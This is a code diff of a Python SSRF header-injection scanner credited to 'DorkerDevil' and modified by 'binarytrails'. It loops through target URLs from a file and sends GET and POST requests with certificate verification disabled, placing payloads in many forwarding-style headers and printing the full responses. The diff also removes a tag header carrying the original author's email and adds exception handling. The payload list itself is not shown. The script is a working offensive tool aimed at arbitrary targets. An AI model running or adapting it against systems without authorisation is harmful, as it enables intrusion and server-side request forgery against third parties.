@@ -13,7 +13,7 @@ disable_warnings()
 from requests_toolbelt.utils import dump
 import re
 
-# coded_by_DorkerDevil
+# coded_by_DorkerDevil and modified by binarytrails
 
 target = sys.argv[1]
 ssrf = sys.argv[2]
@@ -56,7 +56,6 @@ list = [
     'X-Do-Not-Track',
     'X-Foo',
     'X-Foo-Bar',
-    'If-You-SEE-THIS-InYour-Log-cONTACT-dorkerdevil@protonmail.com',
     'X-Forwarded',
     'X-Forwarded-By',
     'X-Forwarded-For',
@@ -123,25 +122,29 @@ for protos in proto:
 
 with open(target, 'r', encoding='utf-8') as fd:
     for i in fd.readlines():
-        url = i.strip()
+        #url = i.strip()
+        url = i.rstrip() # new lines trailing spaces only
         if url == '' or url.startswith('#'):
             continue
 
 for headerz in list:
     for pay in paload:
-        target_headerz = {headerz: pay}
-        r = requests.get(url + '/?something=' + str(ran),
-                         headers=target_headerz, timeout=2,
-                         verify=False, allow_redirects=True)
-        data = dump.dump_all(r)
-        print (data.decode('utf-8'))
-        rpost = requests.post(
-            url + '/?something=' + str(ran),
-            data=pay,
-            headers=target_headerz,
-            timeout=3,
-            verify=False,
-            allow_redirects=True,
-            )
-        data = dump.dump_all(rpost)
-        print (data.decode('utf-8'))
+        try:
+            target_headerz = {headerz: pay}
+            r = requests.get(url,
+                             headers=target_headerz, timeout=2,
+                             verify=False, allow_redirects=True)
+            data = dump.dump_all(r)
+            print (data.decode('utf-8'))
+            rpost = requests.post(
+                url,
+                data=pay,
+                headers=target_headerz,
+                timeout=3,
+                verify=False,
+                allow_redirects=True,
+                )
+            data = dump.dump_all(rpost)
+            print (data.decode('utf-8'))
+        except Exception as e:
+            print (e)
